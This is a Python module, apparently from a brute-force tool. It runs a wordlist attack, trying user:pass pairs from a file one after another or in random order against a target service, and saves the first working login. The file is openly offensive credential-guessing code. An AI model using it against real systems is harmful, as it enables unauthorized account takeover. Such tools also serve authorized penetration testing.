"""
Wordlist Attack
===============
Reads a combined file of  user:pass  entries (one per line).
Tries them sequentially or in random order.
"""
import random

from rich.progress import track

from Design.colors_cli import console
from modules.target import TargetInfo
from modules.attack_config import AttackConfig, load_wordlist
from modules.attacks.common import attempt, save_result, apply_delay


def _parse_entries(raw_lines: list[str]) -> list[tuple[str, str]]:
    entries: list[tuple[str, str]] = []
    skipped = 0
    for line in raw_lines:
        if ":" not in line:
            skipped += 1
            continue
        user, _, password = line.partition(":")
        entries.append((user, password))
    if skipped:
        console.print(
            f"[warning]  ⚠ Skipped {skipped} malformed line(s) "
            f"(no ':' separator).[/warning]"
        )
    return entries


def run(target: TargetInfo, config: AttackConfig) -> None:
    raw_lines = load_wordlist(config.username_file)
    entries   = _parse_entries(raw_lines)

    if not entries:
        raise RuntimeError("No valid user:pass entries found in the wordlist file.")

    if config.random_order:
        random.shuffle(entries)
        order_label = "random"
    else:
        order_label = "sequential"

    console.print(
        f"\n[bold primary][ WORDLIST ATTACK ][/bold primary]\n"
        f"  [muted]Service :[/muted] [primary]{target.service.upper()}[/primary]\n"
        f"  [muted]File    :[/muted] [text]{config.username_file}[/text]\n"
        f"  [muted]Entries :[/muted] [primary]{len(entries):,}[/primary]\n"
        f"  [muted]Order   :[/muted] [text]{order_label}[/text]\n"
        f"  [muted]Delay   :[/muted] [text]{config.delay}s[/text]\n"
    )

    found      = False
    found_user = ""
    found_pass = ""

    for user, password in track(
        entries,
        description="[primary]Trying…[/primary]",
        console=console,
    ):
        if attempt(target.host, target.port, user, password, target.service):
            found      = True
            found_user = user
            found_pass = password
            break
        apply_delay(config.delay)

    if found:
        save_result(target.host, target.port, found_user, found_pass, config.log_file, target.service)
    else:
        console.print(
            f"\n[error]✗ No match found in {len(entries):,} entries.[/error]"
        )
